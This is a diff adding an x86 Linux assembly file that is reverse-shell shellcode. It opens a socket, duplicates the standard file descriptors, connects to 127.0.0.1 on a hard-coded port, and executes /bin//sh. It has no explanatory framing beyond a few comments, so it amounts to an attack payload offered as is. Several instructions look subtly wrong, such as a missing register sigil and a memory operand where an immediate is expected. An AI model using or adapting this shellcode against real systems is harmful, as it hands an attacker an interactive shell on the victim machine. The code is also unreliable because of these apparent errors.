@@ -1,0 +1,52 @@
+
+_start:
+	xorl  %ebx, %ebx
+
+#fd = socket( 2, 1, 0)
+socket:
+	pushl %ebx
+	incl  %ebx
+	pushl %ebx
+	pushl $0x2
+	pushl $0x66
+	popl  %eax
+	movl  %esp, %ecx
+	int  $0x80
+	xchg %ebx, %eax
+
+dup:
+	popl  %ecx
+dup_loop:
+	movb  $0x3f, al
+	int  $0x80
+	decl  %ecx
+	jns  dup_loop
+
+
+connect:
+	popl  %ebx
+	popl  %edx
+	pushl $0x0100007f   # ip address 127.0.0.1
+	pushl $0xbfbf       # port number
+	incl  %ebx
+	push  %bx
+	movl  %esp, %ecx
+	movb  $0x66, %al
+	pushl %eax
+	pushl %ecx
+	pushl %ebx
+	movl  %ecx, %esp
+	incl  %ebx
+	int  $0x80
+
+execve:
+	pushl %edx
+	pushl $0x68732f2f
+	pushl $0x6e69622f
+	movl  %esp, %ebx
+	pushl %edx
+	pushl %ebx
+	movl  %esp, %ecx
+	movb  0x0b, %al
+	int  $0x80
+
